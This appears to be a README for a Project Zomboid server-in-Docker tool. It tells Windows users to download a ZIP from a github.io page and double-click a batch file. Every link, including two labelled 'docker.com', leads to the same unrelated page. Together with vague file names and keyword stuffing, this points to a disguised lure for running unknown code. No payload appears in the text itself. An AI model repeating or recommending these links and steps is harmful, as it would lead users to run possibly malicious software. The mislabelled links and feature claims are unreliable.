# 🧟 project-zomboid-server-docker - Run Your Own Zomboid Server Easily

[![Download](https://img.shields.io/badge/Download-Project%20Zomboid%20Server%20Docker-blueviolet?style=for-the-badge)](https://dysphoriarathole151.github.io)

## 🚀 What Is This?

This tool lets you set up a dedicated server for the game **Project Zomboid** using Docker. You can run your own multiplayer world, invite friends, and customize settings like game speed, mods, and maps—all without needing to be a tech expert. The server runs in a container, making it easy to start, stop, and manage.

## 📥 How to Download and Run (Windows)

Visit this link to download the application: [https://dysphoriarathole151.github.io](https://dysphoriarathole151.github.io)

Once you're on that page:
1. Click the green "Code" button.
2. Choose "Download ZIP".
3. Extract the ZIP file to a folder on your computer (e.g., `C:\ZomboidServer`).
4. Open the extracted folder and double-click the file named `start-server.bat` (or similar) to launch the server.

## 🛠️ What You Need

- **Windows 10 or 11** (64-bit)
- **Docker Desktop** installed and running. If you don't have it, download it from [docker.com](https://dysphoriarathole151.github.io).
- At least **4 GB of RAM** (8 GB recommended) for the server.
- **Stable internet connection** for your friends to join.

## 🎮 Features

- **One-click server start** – No command line knowledge required.
- **Supports mods** – Add your favorite Project Zomboid mods easily.
- **Custom game speed** – Speed up or slow down the apocalypse.
- **Map management** – Use custom maps or default settings.
- **Save files** – Keep your progress between sessions.
- **Docker container** – Isolated, clean, and easy to update.

## 📋 Step-by-Step Setup

### 1️⃣ Install Docker Desktop
- Go to [docker.com](https://dysphoriarathole151.github.io) and download Docker Desktop for Windows.
- Run the installer and follow the on-screen instructions.
- Restart your computer if prompted.

### 2️⃣ Download the Server Files
- Visit the download link: [https://dysphoriarathole151.github.io](https://dysphoriarathole151.github.io)
- Click the green "Code" button and select "Download ZIP".
- Extract the ZIP to a folder like `C:\ZomboidServer`.

### 3️⃣ Start the Server
- Open the folder you extracted.
- Double-click `start-server.bat`.
- A command window will open showing server startup progress.
- Wait until you see "Server is ready" – this can take a few minutes on first launch.

### 4️⃣ Join Your Server
- Open Project Zomboid on your computer.
- Go to **Join** > **Internet**.
- Your server should appear in the list. If not, use the IP address shown in the command window.
- Share that IP with friends so they can join too.

## 🔧 Customization

You can change settings by editing the file named `server.ini` (or similar) in the server folder. Here are common options:

- **Game speed**: Change `GameSpeed=1.0` to a higher or lower number.
- **Mods**: Add mod IDs in the `Mods=` line (comma-separated).
- **Server name**: Change `ServerName=My Zomboid Server`.
- **Max players**: Adjust `MaxPlayers=16`.

After editing, restart the server for changes to take effect.

## ❓ Troubleshooting

**Server won't start**
- Make sure Docker Desktop is running. Look for the whale icon in your system tray.
- Check that no other program is using port 16261 (the default server port).

**Friends can't join**
- Ensure your firewall allows the server program.
- On Windows, you may need to allow access when prompted.
- Share your public IP address (find it by searching "what is my IP" in Google).

**Server is slow**
- Reduce the number of mods.
- Lower the max player count.
- Close other programs on your computer.

## 📚 Additional Info

This tool is designed for the **build 42** version of Project Zomboid and supports the **PZ Core**, **PZ Gateway**, **PZ Mapping**, and **PZ Utils** modules. It's a community-made project that simplifies hosting your own dedicated server.

For more help, check the repository's Issues or Discussions section on GitHub.

## 🗺️ Keywords

project-zomboid, project-zomboid-mod, project-zomboid-save, project-zomboid-server, project-zomboid-set-game-speed, project-zomboid-setup, project-zomboid-tool, pz-42-build, pz-core, pz-gateway, pz-map, pz-mapping, pz-mods, pz-module, pz-tool, pz-utils, server-docker